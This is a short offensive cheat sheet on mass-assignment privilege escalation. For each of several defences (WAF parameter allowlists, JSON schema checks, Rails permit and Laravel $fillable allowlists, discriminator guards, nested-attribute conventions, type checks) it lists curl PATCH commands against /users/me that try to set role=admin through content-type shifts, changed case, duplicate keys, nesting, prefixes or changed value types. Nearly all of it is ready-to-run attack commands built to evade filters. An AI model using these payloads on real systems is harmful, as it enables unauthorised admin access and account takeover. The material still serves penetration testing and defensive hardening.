# Evasion scenarios — getting the field past each specific filter

## Scenario: the WAF strips `role`/`admin` params

The param allowlist at the edge drops `role=admin`.

```bash
# content-type shift — different parser, different filter
curl -X PATCH "$BASE/users/me" -d 'role=admin' -b "$JAR"              # form
curl -X PATCH "$BASE/users/me" -F 'role=admin' -b "$JAR"              # multipart

# case — case-insensitive binders reach it
curl -X PATCH "$BASE/users/me" -d 'Role=admin' -b "$JAR"              # .NET
curl -X PATCH "$BASE/users/me" -d 'ROLE=admin' -b "$JAR"

# dup — filter reads first, binder takes last
curl -X PATCH "$BASE/users/me" -d 'role=user&role=admin' -b "$JAR"
curl -X PATCH "$BASE/users/me" -H 'Content-Type: application/json' \
  -d '{"role":"user","role":"admin"}' -b "$JAR"

# nested — filter checks top-level only
curl -X PATCH "$BASE/users/me" -d '{"profile":{"role":"admin"}}' -b "$JAR"

# array — scalar-only filters
curl -X PATCH "$BASE/users/me" -d 'role[]=admin' -b "$JAR"
```

## Scenario: the JSON schema rejects extras

`additionalProperties:false` `400`s `{"role":"admin"}`.

```bash
# the form path — different parser, no schema
curl -X PATCH "$BASE/users/me" -d 'role=admin' -b "$JAR"

# nested — schema validates parent as object, not contents
curl -X PATCH "$BASE/users/me" -d '{"profile":{"role":"admin"}}' -b "$JAR"

# the update schema — different from create's
curl -X PATCH "$BASE/users/me" -d '{"role":"admin"}' -b "$JAR"    # vs POST
```

## Scenario: `permit`/`$fillable` drops flat `role`

The allowlist drops `role` silently.

```bash
# nested under an allowed parent
curl -X PATCH "$BASE/users/me" -d '{"profile":{"role":"admin"}}' -b "$JAR"
curl -X PATCH "$BASE/users/me" -d '{"settings":{"role":"admin"}}' -b "$JAR"

# prefixed — the allowlist covers `user`, the param reaches `role`
curl -X PATCH "$BASE/users/me" -d 'user[role]=admin' -b "$JAR"      # Rails
curl -X PATCH "$BASE/users/me" -d 'user.role=admin' -b "$JAR"       # dotted

# the second binder — PATCH allowlist wider than POST's
curl -X PATCH "$BASE/users/me" -d '{"role":"admin"}' -b "$JAR"
```

## Scenario: the discriminator is guarded

`_t`/`type` dropped.

```bash
# the sibling discriminator fields
curl -X PATCH "$BASE/users/me" -d '{"type":"admin"}' -b "$JAR"
curl -X PATCH "$BASE/users/me" -d '{"user_type":"admin"}' -b "$JAR"
curl -X PATCH "$BASE/users/me" -d '{"__t":"Admin"}' -b "$JAR"
```

## Scenario: the association needs the right key

`profile` rejected; `profile_attributes` accepted.

```bash
# Rails accepts_nested_attributes_for convention
curl -X PATCH "$BASE/users/me" -d 'user[profile_attributes][role]=admin' -b "$JAR"
curl -X PATCH "$BASE/users/me" -d '{"profile_attributes":{"role":"admin"}}' -b "$JAR"
curl -X PATCH "$BASE/users/me" -d 'user[role_ids][]=1' -b "$JAR"
```

## Scenario: the type check rejects the value

`role:"admin"` filtered by type.

```bash
curl -X PATCH "$BASE/users/me" -d '{"role":1}' -b "$JAR"           # enum int
curl -X PATCH "$BASE/users/me" -d '{"role":true}' -b "$JAR"         # bool
curl -X PATCH "$BASE/users/me" -d '{"roles":["admin"]}' -b "$JAR"   # array
curl -X PATCH "$BASE/users/me" -d '{"groups":[{"id":1}]}' -b "$JAR" # FK array
```
